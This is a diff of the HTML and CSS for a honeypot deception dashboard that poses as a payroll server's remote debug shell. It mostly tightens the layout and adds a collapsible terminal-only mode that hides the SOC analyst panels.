@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-director="closed">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="description" content="The Truman Show Deception Grid — Per-Attacker gVisor Sandbox vs. Covert SOC Director & Agent Substrate Time-Travel Telemetry Rack." />
-  <title>The Truman Show Honeypot — Attacker Movie Set vs. SOC Director's Booth</title>
+  <title>payroll-admin-prod-01 — Remote Debug Shell</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet" />
@@ -181,9 +181,13 @@
       -webkit-font-smoothing: antialiased;
     }
 
+    /* Viewport-locked shell on desktop so the page never grows a weird outer scrollbar */
     body {
-      min-height: 100vh;
-      padding: 12px 16px 24px;
+      height: 100dvh;
+      overflow: hidden;
+      padding: 10px 14px;
+      display: flex;
+      flex-direction: column;
       background-image:
         radial-gradient(circle at 18% 0%, rgba(56, 189, 248, 0.06) 0%, transparent 42%),
         radial-gradient(circle at 82% 0%, rgba(239, 68, 68, 0.07) 0%, transparent 44%);
@@ -195,24 +199,39 @@
     }
 
     .rack-shell {
-      max-width: 1720px;
+      width: 100%;
+      max-width: 1760px;
       margin: 0 auto;
+      flex: 1;
+      min-height: 0;
       border: 1px solid var(--soc-border-strong);
+      border-radius: 6px;
       background: var(--soc-bg);
       box-shadow: var(--rack-shadow);
       display: flex;
       flex-direction: column;
+      overflow: hidden;
     }
 
-    /* Top Deception Control Deck */
+    /* Collapsed Terminal-Only Mode vs Expanded Split-Screen Director Mode */
+    html[data-director="closed"] .director-open-only {
+      display: none !important;
+    }
+
+    html[data-director="open"] .director-closed-only {
+      display: none !important;
+    }
+
+    /* Top Control Deck (Single-Line on Desktop for Zero Vertical Shift) */
     header.faceplate {
       display: flex;
-      flex-wrap: wrap;
+      flex-wrap: nowrap;
       align-items: center;
       justify-content: space-between;
-      gap: 14px;
-      padding: 12px 18px;
+      gap: 12px;
+      padding: 9px 14px;
       border-bottom: 1px solid var(--soc-border-strong);
+      flex-shrink: 0;
       background:
         linear-gradient(180deg, rgba(255, 255, 255, 0.03) 0%, rgba(255, 255, 255, 0) 100%),
         var(--soc-panel);
@@ -221,7 +240,7 @@
     .instrument-id {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 10px;
       min-width: 0;
     }
 
@@ -230,9 +249,9 @@
       flex-direction: column;
       justify-content: space-between;
       width: 12px;
-      height: 40px;
+      height: 36px;
       border-right: 1px solid var(--soc-border-strong);
-      padding-right: 7px;
+      padding-right: 6px;
       color: var(--soc-text-muted);
       font-family: var(--font-mono);
       font-size: 10px;
@@ -241,8 +260,9 @@
     }
 
     .brand-badge {
-      width: 38px;
-      height: 38px;
+      width: 34px;
+      height: 34px;
+      border-radius: 4px;
       border: 1px solid var(--sig-crimson);
       background: var(--sig-crimson-dim);
       display: flex;
@@ -252,25 +272,42 @@
       flex-shrink: 0;
     }
 
+    .shell-badge {
+      width: 32px;
+      height: 32px;
+      border-radius: 4px;
+      border: 1px solid var(--soc-border-strong);
+      background: var(--soc-bay);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--sig-emerald-bright);
+      flex-shrink: 0;
+    }
+
     .title-block {
       display: flex;
       flex-direction: column;
-      gap: 2px;
+      gap: 1px;
       min-width: 0;
     }
 
     .title-eyebrow {
       font-family: var(--font-mono);
-      font-size: 10.5px;
+      font-size: 10px;
       font-weight: 700;
-      letter-spacing: 0.08em;
+      letter-spacing: 0.07em;
       text-transform: uppercase;
       color: var(--sig-ice-bright);
     }
 
+    .title-eyebrow.neutral {
+      color: var(--soc-text-muted);
+    }
+
     .title-block h1 {
       margin: 0;
-      font-size: 1.18rem;
+      font-size: 1.08rem;
       font-weight: 700;
       letter-spacing: -0.02em;
       color: var(--soc-text);
@@ -279,9 +316,42 @@
     .header-controls {
       display: flex;
       align-items: center;
-      flex-wrap: wrap;
-      gap: 10px;
+      flex-wrap: nowrap;
+      gap: 8px;
       margin-left: auto;
+      flex-shrink: 0;
+    }
+
+    /* SOC Target Actor Switcher Strip (Inside SOC Booth so Header Never Wraps) */
+    .soc-session-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      padding: 6px 12px;
+      border-bottom: 1px solid var(--soc-border);
+      background: var(--soc-subhead-bg);
+      flex-wrap: wrap;
+      flex-shrink: 0;
+    }
+
+    .soc-session-left {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex-wrap: wrap;
+      min-width: 0;
+    }
+
+    .soc-session-label {
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      font-weight: 700;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      color: var(--soc-text-muted);
+      margin-right: 2px;
+      user-select: none;
     }
 
     .session-tabs {
@@ -295,14 +365,14 @@
       color: var(--soc-text-secondary);
       border: 1px solid var(--soc-border-strong);
       border-radius: 3px;
-      padding: 6px 11px;
-      font-size: 11.5px;
+      padding: 5px 10px;
+      font-size: 11px;
       font-family: var(--font-mono);
       font-weight: 600;
       cursor: pointer;
       display: inline-flex;
       align-items: center;
-      gap: 7px;
+      gap: 6px;
       transition: border-color 0.15s ease, background-color 0.15s ease;
     }
 
@@ -315,7 +385,6 @@
       background: var(--sig-ice-dim);
       color: var(--soc-text);
       border-color: var(--sig-ice);
-      box-shadow: 0 0 14px rgba(56, 189, 248, 0.18);
     }
 
     .tab-ver-badge {
@@ -355,16 +424,82 @@
       background: var(--soc-input-bg);
       border: 1px solid var(--soc-border-strong);
       border-radius: 3px;
-      padding: 6px 9px;
+      padding: 5px 8px;
       color: var(--soc-text);
       font-family: var(--font-mono);
       font-size: 11px;
-      width: 165px;
+      width: 150px;
     }
 
     .actor-spawn-input:focus {
       outline: 1px solid var(--sig-ice);
       border-color: var(--sig-ice);
+    }
+
+    .btn {
+      background: var(--soc-bay);
+      color: var(--soc-text);
+      border: 1px solid var(--soc-border-strong);
+      border-radius: 4px;
+      padding: 6px 10px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: background-color 0.14s ease, border-color 0.14s ease, transform 0.1s ease;
+    }
+
+    .btn svg {
+      flex-shrink: 0;
+    }
+
+    .btn:hover:not(:disabled) {
+      background: var(--soc-bay-hover);
+      border-color: var(--sig-ice);
+    }
+
+    .btn:active:not(:disabled) {
+      transform: translateY(1px);
+    }
+
+    .btn:disabled {
+      opacity: 0.55;
+      cursor: wait;
+    }
+
+    .btn.danger {
+      background: var(--sig-crimson-dim);
+      border-color: var(--sig-crimson);
+      color: var(--sig-crimson-bright);
+    }
+
+    .btn.danger:hover:not(:disabled) {
+      border-color: var(--sig-crimson-bright);
+    }
+
+    .btn.director-toggle.active {
+      background: var(--sig-crimson-dim);
+      border-color: var(--sig-crimson);
+      color: var(--sig-crimson-bright);
+    }
+
+    .director-count-pill {
+      padding: 0 5px;
+      border-radius: 999px;
+      font-size: 10px;
+      font-weight: 700;
+      background: var(--sig-crimson-dim);
+      color: var(--sig-crimson-bright);
+      border: 1px solid var(--sig-crimson);
+      line-height: 1.4;
+    }
+
+    .btn.reset-btn:hover:not(:disabled) {
+      border-color: var(--sig-amber);
+      color: var(--sig-amber-bright);
     }
 
     /* Icon-Only Segmented Theme Toggle (Constant Dimensions — Zero Layout Shift) */
@@ -380,8 +515,8 @@
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      width: 30px;
-      height: 26px;
+      width: 28px;
+      height: 24px;
       border-radius: 2px;
       border: 1px solid transparent;
       color: var(--soc-text-muted);
@@ -402,45 +537,45 @@
     /* Main Asymmetric Split Grid: Movie Set | One-Way Mirror | SOC Booth */
     .truman-stage-grid {
       display: grid;
-      grid-template-columns: minmax(0, 1fr) 34px minmax(0, 1.18fr);
-      min-height: calc(100vh - 102px);
+      grid-template-columns: minmax(0, 0.98fr) 32px minmax(0, 1.18fr);
+      flex: 1;
+      min-height: 0;
+      overflow: hidden;
     }
 
-    @media (max-width: 1100px) {
-      .truman-stage-grid {
-        grid-template-columns: 1fr;
-      }
-      .one-way-mirror {
-        flex-direction: row !important;
-        height: 32px;
-        padding: 4px 12px !important;
-      }
-      .mirror-label {
-        writing-mode: horizontal-tb !important;
-        transform: none !important;
-      }
+    /* Collapsed Initial Mode: Full-Stage Clean Terminal Window */
+    html[data-director="closed"] .truman-stage-grid {
+      grid-template-columns: minmax(0, 1fr);
     }
 
     /* ==========================================================================
-       LEFT PANE: THE MOVIE SET (CORPORATE INTRANET FACADE)
+       LEFT PANE: THE MOVIE SET / STANDALONE TERMINAL
        ========================================================================== */
     .movie-set-pane {
       background: var(--set-bg);
       color: var(--set-ink);
       display: flex;
       flex-direction: column;
+      min-height: 0;
+      overflow: hidden;
       border-right: 1px solid var(--set-border-strong);
+    }
+
+    html[data-director="closed"] .movie-set-pane {
+      background: var(--soc-bg);
+      border-right: none;
     }
 
     .browser-chrome {
       background: var(--set-chrome-bg);
       border-bottom: 1px solid var(--set-border-strong);
-      padding: 9px 14px;
+      padding: 7px 12px;
       display: flex;
       align-items: center;
       justify-content: space-between;
       gap: 10px;
       flex-wrap: wrap;
+      flex-shrink: 0;
     }
 
     .window-dots {
@@ -463,14 +598,14 @@
 
     .url-bar {
       flex: 1;
-      min-width: 240px;
+      min-width: 220px;
       background: var(--set-url-bg);
       color: var(--set-url-text);
       border: 1px solid var(--set-url-border);
       border-radius: 4px;
-      padding: 5px 10px;
+      padding: 4px 10px;
       font-family: var(--font-mono);
-      font-size: 11.5px;
+      font-size: 11px;
       display: flex;
       align-items: center;
       gap: 7px;
@@ -488,10 +623,10 @@
       display: inline-flex;
       align-items: center;
       gap: 6px;
-      padding: 4px 8px;
+      padding: 3px 8px;
       border-radius: 3px;
       font-family: var(--font-mono);
-      font-size: 10.5px;
+      font-size: 10px;
       font-weight: 700;
       background: var(--set-stage-pill-bg);
       color: var(--set-stage-pill-text);
@@ -499,44 +634,54 @@
     }
 
     .movie-set-body {
-      padding: 14px 16px;
+      padding: 10px 12px;
       display: flex;
       flex-direction: column;
-      gap: 12px;
+      gap: 9px;
       flex: 1;
+      min-height: 0;
+      overflow-y: auto;
     }
 
-    /* AcmeCorp Enterprise Portal Card */
+    html[data-director="closed"] .movie-set-body {
+      max-width: 1220px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 16px 20px;
+      overflow: hidden;
+    }
+
+    /* AcmeCorp Enterprise Portal Card (Shown in Split-Screen Movie Set View) */
     .corp-portal-card {
       background: var(--set-surface);
       border: 1px solid var(--set-border);
-      border-radius: 6px;
-      padding: 12px 14px;
-      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.04);
+      border-radius: 5px;
+      padding: 9px 12px;
       display: flex;
       flex-direction: column;
-      gap: 10px;
+      gap: 8px;
+      flex-shrink: 0;
     }
 
     .corp-portal-top {
       display: flex;
       justify-content: space-between;
-      align-items: flex-start;
-      gap: 10px;
+      align-items: center;
+      gap: 8px;
       flex-wrap: wrap;
       border-bottom: 1px solid var(--set-border);
-      padding-bottom: 9px;
+      padding-bottom: 7px;
     }
 
     .corp-brand-row {
       display: flex;
       align-items: center;
-      gap: 9px;
+      gap: 8px;
     }
 
     .corp-logo-box {
-      width: 30px;
-      height: 30px;
+      width: 26px;
+      height: 26px;
       border-radius: 4px;
       background: var(--set-accent-blue-bg);
       border: 1px solid var(--set-accent-blue);
@@ -548,23 +693,22 @@
     }
 
     .corp-title {
-      font-size: 14px;
+      font-size: 13px;
       font-weight: 700;
       color: var(--set-ink);
     }
 
     .corp-meta {
       font-family: var(--font-mono);
-      font-size: 10.5px;
+      font-size: 10px;
       color: var(--set-ink-muted);
-      margin-top: 2px;
     }
 
     .debug-mode-pill {
       font-family: var(--font-mono);
-      font-size: 10.5px;
+      font-size: 10px;
       font-weight: 700;
-      padding: 3px 8px;
+      padding: 2px 7px;
       border-radius: 3px;
       background: var(--set-debug-pill-bg);
       color: var(--set-debug-pill-text);
@@ -577,7 +721,7 @@
     .decoy-grid {
       display: grid;
       grid-template-columns: repeat(2, minmax(0, 1fr));
-      gap: 10px;
+      gap: 8px;
     }
 
     @media (max-width: 640px) {
@@ -589,23 +733,16 @@
     .decoy-card {
       background: var(--set-surface-alt);
       border: 1px solid var(--set-border);
-      border-radius: 5px;
-      padding: 9px 11px;
+      border-radius: 4px;
+      padding: 7px 9px;
       display: flex;
       flex-direction: column;
       justify-content: space-between;
-      gap: 6px;
-    }
-
-    .decoy-card-head {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 6px;
+      gap: 5px;
     }
 
     .decoy-card-label {
-      font-size: 10px;
+      font-size: 9.5px;
       font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 0.05em;
@@ -614,10 +751,10 @@
 
     .decoy-card-val {
       font-family: var(--font-mono);
-      font-size: 11px;
+      font-size: 10.5px;
       color: var(--set-ink);
       word-break: break-all;
-      line-height: 1.35;
+      line-height: 1.3;
     }
 
     .decoy-path {
@@ -631,14 +768,14 @@
       color: var(--set-ink-secondary);
       border: 1px solid var(--set-border-strong);
       border-radius: 3px;
-      padding: 3px 8px;
+      padding: 2px 7px;
       font-family: var(--font-mono);
-      font-size: 10px;
+      font-size: 9.5px;
       font-weight: 600;
       cursor: pointer;
       display: inline-flex;
       align-items: center;
-      gap: 5px;
+      gap: 4px;
     }
 
     .decoy-inspect-btn:hover {
@@ -647,18 +784,26 @@
       background: var(--set-accent-blue-bg);
     }
 
-    /* Embedded Web-Shell Drawer inside Movie Set */
+    /* Web-Shell Drawer / Standalone Terminal Window */
     .webshell-drawer {
       background: var(--webshell-bg);
       border: 1px solid var(--soc-border-strong);
       border-radius: 6px;
-      padding: 12px;
+      padding: 10px;
       color: var(--soc-text);
       display: flex;
       flex-direction: column;
-      gap: 10px;
+      gap: 8px;
       flex: 1;
+      min-height: 240px;
       box-shadow: 0 10px 24px rgba(15, 23, 42, 0.14);
+    }
+
+    html[data-director="closed"] .webshell-drawer {
+      padding: 0;
+      gap: 0;
+      overflow: hidden;
+      box-shadow: 0 20px 48px rgba(0, 0, 0, 0.45);
     }
 
     .playbook-header {
@@ -667,56 +812,26 @@
       justify-content: space-between;
       gap: 8px;
       font-family: var(--font-mono);
-      font-size: 10.5px;
+      font-size: 10px;
       font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 0.06em;
       color: var(--soc-text-muted);
+      flex-shrink: 0;
     }
 
     .playbook-bar {
       display: grid;
       grid-template-columns: repeat(2, minmax(0, 1fr));
-      gap: 7px;
-    }
-
-    .btn {
-      background: var(--soc-bay);
-      color: var(--soc-text);
-      border: 1px solid var(--soc-border-strong);
-      border-radius: 4px;
-      padding: 7px 10px;
-      font-family: var(--font-mono);
-      font-size: 11.5px;
-      font-weight: 600;
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      transition: background-color 0.14s ease, border-color 0.14s ease, transform 0.1s ease;
-    }
-
-    .btn svg {
+      gap: 6px;
       flex-shrink: 0;
     }
 
-    .btn:hover {
-      background: var(--soc-bay-hover);
-      border-color: var(--sig-ice);
-    }
-
-    .btn:active {
-      transform: translateY(1px);
-    }
-
-    .btn.danger {
-      background: var(--sig-crimson-dim);
-      border-color: var(--sig-crimson);
-      color: var(--sig-crimson-bright);
-    }
-
-    .btn.danger:hover {
-      border-color: var(--sig-crimson-bright);
+    .terminal-frame {
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+      min-height: 0;
     }
 
     .terminal-chrome {
@@ -724,7 +839,7 @@
       align-items: center;
       justify-content: space-between;
       gap: 8px;
-      padding: 6px 10px;
+      padding: 7px 11px;
       background: var(--webshell-chrome-bg);
       border: 1px solid var(--soc-border-strong);
       border-bottom: none;
@@ -732,6 +847,21 @@
       font-family: var(--font-mono);
       font-size: 11px;
       color: var(--soc-text-muted);
+      flex-shrink: 0;
+    }
+
+    html[data-director="closed"] .terminal-chrome {
+      border: none;
+      border-bottom: 1px solid var(--soc-border-strong);
+      border-radius: 0;
+      padding: 9px 14px;
+    }
+
+    .terminal-chrome-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      min-width: 0;
     }
 
     .terminal-meta-right {
@@ -753,7 +883,7 @@
     .exit-pill.err {
       background: var(--sig-crimson-dim);
       color: var(--sig-crimson-bright);
-      border-color: rgba(239, 68, 68, 0.45);
+      border: 1px solid rgba(239, 68, 68, 0.45);
     }
 
     .term-clear-btn {
@@ -772,27 +902,33 @@
       border-color: var(--sig-ice);
     }
 
+    /* Terminal fills 100% of remaining height with internal scrolling (no artificial max-height gap) */
     .terminal {
       background: var(--term-bg);
       border: 1px solid var(--soc-border-strong);
       border-radius: 0 0 4px 4px;
-      padding: 11px 12px;
+      padding: 12px 14px;
       font-family: var(--font-mono);
-      font-size: 12px;
+      font-size: 12.5px;
       color: var(--term-text);
-      min-height: 270px;
-      max-height: 380px;
+      min-height: 190px;
       overflow-y: auto;
-      line-height: 1.45;
+      line-height: 1.5;
       flex: 1;
       display: flex;
       flex-direction: column;
       cursor: text;
     }
 
+    html[data-director="closed"] .terminal {
+      border: none;
+      border-radius: 0;
+      padding: 16px 18px;
+      font-size: 13.5px;
+    }
+
     .terminal:focus-within {
       border-color: var(--sig-ice);
-      box-shadow: 0 0 0 1px rgba(56, 189, 248, 0.25);
     }
 
     .terminal-history {
@@ -809,7 +945,7 @@
       display: flex;
       align-items: center;
       width: 100%;
-      min-height: 18px;
+      min-height: 20px;
     }
 
     .terminal-prompt-prefix {
@@ -829,14 +965,65 @@
       margin: 0;
       color: var(--term-input-text);
       font-family: var(--font-mono);
-      font-size: 12px;
-      line-height: 1.45;
+      font-size: inherit;
+      line-height: 1.5;
       caret-color: var(--term-text);
     }
 
     .terminal-inline-input::placeholder {
       color: var(--soc-text-muted);
       opacity: 0.6;
+    }
+
+    /* Subtle Command Chips Footer in Collapsed Terminal Mode */
+    .terminal-quick-chips {
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 6px;
+      padding: 7px 14px;
+      background: var(--webshell-chrome-bg);
+      border-top: 1px solid var(--soc-border);
+      flex-shrink: 0;
+    }
+
+    .quick-chips-label {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      color: var(--soc-text-muted);
+      margin-right: 2px;
+      user-select: none;
+    }
+
+    .quick-chip {
+      background: var(--soc-panel);
+      color: var(--soc-text-secondary);
+      border: 1px solid var(--soc-border-strong);
+      border-radius: 3px;
+      padding: 3px 8px;
+      font-family: var(--font-mono);
+      font-size: 10.5px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      transition: border-color 0.14s ease, color 0.14s ease;
+    }
+
+    .quick-chip:hover {
+      border-color: var(--sig-ice);
+      color: var(--soc-text);
+    }
+
+    .quick-chip.wipe:hover {
+      border-color: var(--sig-crimson);
+      color: var(--sig-crimson-bright);
+    }
+
+    .quick-chip kbd {
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      color: var(--soc-text-muted);
     }
 
     /* ==========================================================================
@@ -850,9 +1037,14 @@
       flex-direction: column;
       align-items: center;
       justify-content: space-between;
-      padding: 14px 4px;
+      padding: 12px 4px;
       user-select: none;
       position: relative;
+      cursor: pointer;
+    }
+
+    .one-way-mirror:hover .mirror-label {
+      color: var(--soc-text);
     }
 
     .mirror-sensor {
@@ -879,10 +1071,11 @@
       font-family: var(--font-mono);
       font-size: 10px;
       font-weight: 700;
-      letter-spacing: 0.16em;
+      letter-spacing: 0.15em;
       text-transform: uppercase;
       color: var(--mirror-label);
       white-space: nowrap;
+      transition: color 0.15s ease;
     }
 
     /* ==========================================================================
@@ -893,10 +1086,12 @@
       color: var(--soc-text);
       display: flex;
       flex-direction: column;
+      min-height: 0;
+      overflow: hidden;
     }
 
     .soc-header {
-      padding: 10px 16px;
+      padding: 8px 14px;
       border-bottom: 1px solid var(--soc-border-strong);
       background: var(--soc-header-bg);
       display: flex;
@@ -904,6 +1099,7 @@
       justify-content: space-between;
       gap: 10px;
       flex-wrap: wrap;
+      flex-shrink: 0;
     }
 
     .soc-header-title {
@@ -911,7 +1107,7 @@
       align-items: center;
       gap: 8px;
       font-family: var(--font-mono);
-      font-size: 11.5px;
+      font-size: 11px;
       font-weight: 700;
       letter-spacing: 0.05em;
       text-transform: uppercase;
@@ -920,9 +1116,9 @@
 
     .toast-pill {
       font-family: var(--font-mono);
-      font-size: 11px;
+      font-size: 10.5px;
       font-weight: 600;
-      padding: 3px 9px;
+      padding: 2px 8px;
       border-radius: 3px;
       background: var(--sig-amber-dim);
       color: var(--sig-amber-bright);
@@ -935,21 +1131,17 @@
       grid-template-columns: repeat(3, minmax(0, 1fr));
       border-bottom: 1px solid var(--soc-border-strong);
       background: var(--soc-panel);
-    }
-
-    @media (max-width: 720px) {
-      .soc-readout-strip {
-        grid-template-columns: 1fr;
-      }
+      flex-shrink: 0;
     }
 
     .soc-bay {
-      padding: 10px 14px;
+      padding: 8px 12px;
       border-right: 1px solid var(--soc-border);
       display: flex;
       flex-direction: column;
       justify-content: space-between;
-      gap: 4px;
+      gap: 3px;
+      min-width: 0;
     }
 
     .soc-bay:last-child {
@@ -958,7 +1150,7 @@
 
     .soc-bay-head {
       font-family: var(--font-mono);
-      font-size: 10px;
+      font-size: 9.5px;
       font-weight: 700;
       letter-spacing: 0.06em;
       text-transform: uppercase;
@@ -966,19 +1158,22 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
+      gap: 4px;
     }
 
     .soc-bay-val {
       font-family: var(--font-mono);
-      font-size: 13px;
+      font-size: 12px;
       font-weight: 700;
       color: var(--soc-text);
-      word-break: break-word;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
     }
 
     .soc-bay-sub {
       font-family: var(--font-mono);
-      font-size: 10.5px;
+      font-size: 10px;
       color: var(--soc-text-muted);
       overflow: hidden;
       text-overflow: ellipsis;
@@ -986,11 +1181,13 @@
     }
 
     .soc-body {
-      padding: 14px 16px;
+      padding: 10px 12px;
       display: flex;
       flex-direction: column;
-      gap: 12px;
+      gap: 9px;
       flex: 1;
+      min-height: 0;
+      overflow-y: auto;
     }
 
     /* Substrate Time-Travel Deck & Snapshot Scrubber */
@@ -998,16 +1195,17 @@
       background: var(--soc-panel);
       border: 1px solid var(--soc-border-strong);
       border-radius: 5px;
-      padding: 10px 12px;
+      padding: 8px 10px;
       display: flex;
       flex-direction: column;
-      gap: 10px;
+      gap: 8px;
+      flex-shrink: 0;
     }
 
     .deck-controls {
       display: flex;
       flex-wrap: wrap;
-      gap: 7px;
+      gap: 6px;
     }
 
     .btn.soc-save {
@@ -1034,6 +1232,13 @@
       color: var(--badge-deleted-text);
     }
 
+    .btn.soc-reset-actor {
+      margin-left: auto;
+      background: var(--soc-panel-alt);
+      border-color: var(--soc-border-strong);
+      color: var(--soc-text-secondary);
+    }
+
     .timeline-scrubber {
       display: flex;
       align-items: center;
@@ -1041,20 +1246,22 @@
       flex-wrap: wrap;
       padding-top: 6px;
       border-top: 1px solid var(--soc-border);
+      max-height: 62px;
+      overflow-y: auto;
     }
 
     .snap-node {
       background: var(--soc-panel-alt);
       border: 1px solid var(--soc-border-strong);
       border-radius: 3px;
-      padding: 4px 9px;
+      padding: 3px 8px;
       font-family: var(--font-mono);
-      font-size: 10.5px;
+      font-size: 10px;
       color: var(--soc-text-secondary);
       cursor: pointer;
       display: inline-flex;
       align-items: center;
-      gap: 6px;
+      gap: 5px;
       transition: border-color 0.14s ease, background-color 0.14s ease;
     }
 
@@ -1080,7 +1287,7 @@
 
     .snap-arrow {
       font-family: var(--font-mono);
-      font-size: 11px;
+      font-size: 10.5px;
       color: var(--soc-text-muted);
     }
 
@@ -1089,13 +1296,14 @@
       background: var(--canary-alert-bg);
       border: 1px solid var(--sig-crimson);
       border-radius: 5px;
-      padding: 9px 12px;
+      padding: 7px 10px;
       font-family: var(--font-mono);
-      font-size: 11.5px;
+      font-size: 11px;
       color: var(--canary-alert-text);
       display: flex;
       flex-direction: column;
-      gap: 5px;
+      gap: 4px;
+      flex-shrink: 0;
     }
 
     .canary-box.clean {
@@ -1115,15 +1323,11 @@
     /* Split Rootfs Overlay Delta Table + Live Payload Inspector */
     .forensic-split {
       display: grid;
-      grid-template-columns: minmax(0, 1.15fr) minmax(0, 1fr);
-      gap: 10px;
-      align-items: stretch;
-    }
-
-    @media (max-width: 780px) {
-      .forensic-split {
-        grid-template-columns: 1fr;
-      }
+      grid-template-columns: minmax(0, 1.18fr) minmax(0, 1fr);
+      gap: 9px;
+      height: 186px;
+      min-height: 160px;
+      flex-shrink: 0;
     }
 
     .delta-panel, .inspector-panel {
@@ -1132,15 +1336,16 @@
       border-radius: 5px;
       display: flex;
       flex-direction: column;
+      min-height: 0;
       overflow: hidden;
     }
 
     .subpanel-head {
-      padding: 7px 10px;
+      padding: 6px 10px;
       background: var(--soc-subhead-bg);
       border-bottom: 1px solid var(--soc-border);
       font-family: var(--font-mono);
-      font-size: 10.5px;
+      font-size: 10px;
       font-weight: 700;
       text-transform: uppercase;
       letter-spacing: 0.05em;
@@ -1149,23 +1354,59 @@
       align-items: center;
       justify-content: space-between;
       gap: 8px;
+      flex-shrink: 0;
+      min-width: 0;
+    }
+
+    .subpanel-head > span:first-child {
+      min-width: 0;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .subpanel-head > span:last-child {
+      flex-shrink: 0;
+      white-space: nowrap;
+      color: var(--soc-text-muted);
+    }
+
+    .delta-table-scroll {
+      flex: 1;
+      min-height: 0;
+      overflow-y: auto;
+      overflow-x: hidden;
     }
 
     table.delta-table {
       width: 100%;
+      table-layout: fixed;
       border-collapse: collapse;
       font-family: var(--font-mono);
-      font-size: 11px;
+      font-size: 10.5px;
     }
 
     table.delta-table th,
     table.delta-table td {
       text-align: left;
-      padding: 6px 8px;
+      padding: 5px 6px;
       border-bottom: 1px solid var(--soc-border);
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
     }
 
+    table.delta-table th:nth-child(1),
+    table.delta-table td:nth-child(1) { width: 78px; }
+    table.delta-table th:nth-child(3),
+    table.delta-table td:nth-child(3) { width: 58px; }
+    table.delta-table th:nth-child(4),
+    table.delta-table td:nth-child(4) { width: 74px; }
+
     table.delta-table th {
+      position: sticky;
+      top: 0;
+      z-index: 1;
       color: var(--soc-text-muted);
       font-size: 9.5px;
       text-transform: uppercase;
@@ -1189,7 +1430,7 @@
     .badge {
       padding: 2px 5px;
       border-radius: 2px;
-      font-size: 9.5px;
+      font-size: 9px;
       font-weight: 700;
       display: inline-block;
     }
@@ -1220,25 +1461,24 @@
 
     .inspector-body {
       margin: 0;
-      padding: 10px;
+      padding: 9px 10px;
       background: var(--soc-code-bg);
       color: var(--sig-ice-bright);
       font-family: var(--font-mono);
-      font-size: 11px;
+      font-size: 10.5px;
       line-height: 1.45;
       white-space: pre-wrap;
       word-break: break-all;
-      min-height: 135px;
-      max-height: 210px;
       overflow-y: auto;
       flex: 1;
+      min-height: 0;
     }
 
     .inspector-body.deleted-notice {
       color: var(--sig-amber-bright);
     }
 
-    /* Silent In-Memory Forensic Audit Trail */
+    /* Silent In-Memory Forensic Audit Trail (Fills Remaining SOC Booth Height) */
     .audit-panel {
       background: var(--soc-panel);
       border: 1px solid var(--soc-border-strong);
@@ -1247,12 +1487,12 @@
       flex-direction: column;
       overflow: hidden;
       flex: 1;
+      min-height: 135px;
     }
 
     .audit-list {
       background: var(--soc-code-bg);
       padding: 8px 10px;
-      max-height: 165px;
       overflow-y: auto;
       font-family: var(--font-mono);
       font-size: 11px;
@@ -1260,6 +1500,7 @@
       flex-direction: column;
       gap: 5px;
       flex: 1;
+      min-height: 0;
     }
 
     .audit-row {
@@ -1273,41 +1514,104 @@
     .audit-row:last-child {
       border-bottom: none;
     }
+
+    /* Responsive fallback on narrow screens */
+    @media (max-width: 1100px) {
+      body {
+        height: auto;
+        min-height: 100dvh;
+        overflow-y: auto;
+      }
+      .rack-shell {
+        overflow: visible;
+      }
+      .truman-stage-grid {
+        grid-template-columns: 1fr;
+        overflow: visible;
+      }
+      .one-way-mirror {
+        flex-direction: row !important;
+        height: 32px;
+        padding: 4px 12px !important;
+      }
+      .mirror-label {
+        writing-mode: horizontal-tb !important;
+        transform: none !important;
+      }
+      .forensic-split {
+        grid-template-columns: 1fr;
+        height: auto;
+      }
+      .delta-table-scroll,
+      .inspector-body,
+      .audit-list {
+        max-height: 220px;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="rack-shell">
-    <!-- TOP DECEPTION CONTROL DECK -->
+    <!-- TOP CONTROL DECK (Minimal Shell Bar when Collapsed -> Full Deception Header when Open) -->
     <header class="faceplate">
       <div class="instrument-id">
-        <div class="rack-ears" aria-hidden="true">
+        <div class="rack-ears director-open-only" aria-hidden="true">
           <span>o</span>
           <span>o</span>
         </div>
-        <div class="brand-badge" aria-hidden="true">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <div class="brand-badge director-open-only" aria-hidden="true">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
             <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
             <circle cx="12" cy="11" r="2.5"/>
           </svg>
